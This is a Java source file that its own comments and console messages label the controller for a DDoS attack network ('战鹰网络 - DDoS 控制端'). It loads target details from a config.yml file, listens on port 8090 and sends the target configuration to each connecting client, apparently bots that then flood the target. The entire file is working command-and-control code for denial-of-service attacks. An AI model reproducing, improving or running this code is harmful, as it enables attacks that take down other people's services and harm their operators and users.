package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * @ClassName : Runner
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 3.0
 */

public class Runner extends Thread {
    static Socket socket;
    static String targetHost;
    static String ClientIP;
    static ServerSocket serverSocket;
    static Yaml yml = new Yaml();
    static String path = "config.yml"; // 这个config.yml放在jar文件的同目录 具体配置内容参考源码里的
    static int attackSecond;

    public static void main(String[] args) { // 这里负责把yml内容读取后发送给客户端
        try {
            File targetConfigPathFirstRunShow = new File(path); // 目标配置文件信息
            long targetConfigLenthFirstRunShow = targetConfigPathFirstRunShow.length();
            byte[] b = new byte[(int) targetConfigLenthFirstRunShow];
            FileInputStream fis = new FileInputStream(targetConfigPathFirstRunShow);
            fis.read(b);
            fis.close();
            String targetConfigInfoFirstRunShow = new String(b, "GBK");
            System.out.println("[+] 战鹰网络 - DDoS 控制端：当前目标配置文件信息");
            System.out.println("[+] 战鹰网络 - DDoS 控制端：" + targetConfigInfoFirstRunShow.replace("\n", "")); // 去除多余的回车符
            serverSocket = new ServerSocket(8090);
            System.out.println("[+] 战鹰网络 - DDoS 控制端：端口监听成功。");
            InputTargetThread i = new InputTargetThread();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动中...");
            i.start();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动成功。");
            while (true) {
                socket = serverSocket.accept();
                ClientIP = socket.getInetAddress().getHostAddress();
                Runner runner = new Runner();
                runner.start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() { // 每次客户端连接就用子线程发送一次目标信息配置文件
        try {
            File targetConfigPath = new File(path); // 目标配置文件信息
            long targetConfigLenth = targetConfigPath.length();
            byte[] b = new byte[(int) targetConfigLenth];
            FileInputStream fis = new FileInputStream(targetConfigPath);
            fis.read(b);
            fis.close();
            String targetConfigInfo = new String(b, "GBK");
            OutputStream os = socket.getOutputStream();
            os.write(targetConfigInfo.getBytes());
            os.close();
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}